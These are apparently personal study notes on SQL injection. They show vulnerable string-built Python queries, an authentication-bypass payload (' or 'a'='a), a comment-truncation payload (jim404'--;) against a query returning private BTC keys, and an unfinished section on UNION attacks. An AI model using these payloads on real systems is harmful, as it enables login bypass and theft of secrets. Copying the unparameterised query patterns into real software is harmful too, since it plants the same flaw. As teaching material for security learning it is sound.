# Main Ideas
- Original query must not be properly sanitized or paramaterized.
  - The query needs to just insert in the untrusted user into.
  - The query directly inserts user input values as variables.
- Properly escape the start and end of the query.
- Create a new query to run.
  - Test the query at https://www.db-fiddle.com/
- Match the return type of the original query to get results back.
- Send multiple SQL functions to run inside one input query.

# Check For Missing Paramaterization

## SQL Injection Likely
- `query = f"SELECT username FROM users WHERE username='{inputVarHere}'"`
- `query = "SELECT username FROM users WHERE username='" + inputVarHere + "'"`

## SQL Injection Unlikely


# Examples 

## Match Any - Single Record
`query = f"SELECT username, created_at FROM users WHERE username='{inputVarHere}' and password = '{passwordVariable}'"`
Mess with the input variable to create the query you want.
You can pass something like `' or 'a'='a`
The first single quote will escape, and you leave off the last single quote
`query = f"SELECT username, created_at FROM users WHERE username='usernameToAcess' and password = '' or 'a'='a'"`

## Return Early - Single Record
Typically you will start with a single quote
If you want to ignore everything after the query use `'--;` to end
Ex. `query = "SELECT username, public_btc_address, private_btc_key, balance FROM users WHERE username='" + username + "' AND password_hash='" + password_hash + "';"`
Payload. `username=jim404'--;`


## Union
Use this when you want to select records from a different table.
You need to select the same rows and data type from the original query will produce.
